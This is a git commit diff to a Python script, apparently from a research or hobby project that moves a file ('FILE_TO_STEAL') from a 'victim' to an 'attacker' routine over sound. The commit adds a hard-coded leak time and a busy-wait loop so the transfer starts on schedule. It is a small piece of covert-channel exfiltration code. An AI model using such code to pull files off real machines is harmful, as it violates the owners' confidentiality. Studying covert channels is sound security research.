01e20dbadba37dd369897fdfdeb903441ed2043d
YanivBir <yaniv.birka@gmail.com>
2019-04-29 11:42:06 +0300

    Add start time leak

--- main.py
+++ main.py
@@ -2,9 +2,13 @@ import huffman.huffman as huffman
 import huffman.freq as freq
 from sound.sound_decoder import *
 import textwrap
+import datetime
 
 FILE_TO_STEAL = '/home/yaniv/PycharmProjects/AudioAlpha/data/my_codes.txt'
 STOLEN_FILE = '/home/yaniv/PycharmProjects/AudioAlpha/data/his_codes.txt'
+LEAK_TIME_STR = '11:40'
+LEAK_TIME_HOUR = int(LEAK_TIME_STR[:2])
+LEAK_TIME_MIN = int(LEAK_TIME_STR[3:5])
 
 def victim(sound_send,sound_recv):
     with open(FILE_TO_STEAL) as f:
@@ -24,10 +28,9 @@ def attacker(sound_send,sound_recv):
         print('attacker() got huffman_data null')
 
 def main():
-    # if len(sys.argv) == 2 and sys.argv[1] == 'v':
-    #     victim()
-    # else:
-    #     attacker()
+    leak_time = datetime.time(LEAK_TIME_HOUR, LEAK_TIME_MIN, 00)
+    while (datetime.datetime.now().time() < leak_time):
+        pass
     sound_send = Encoder()
     sound_recv = Decoder()
 
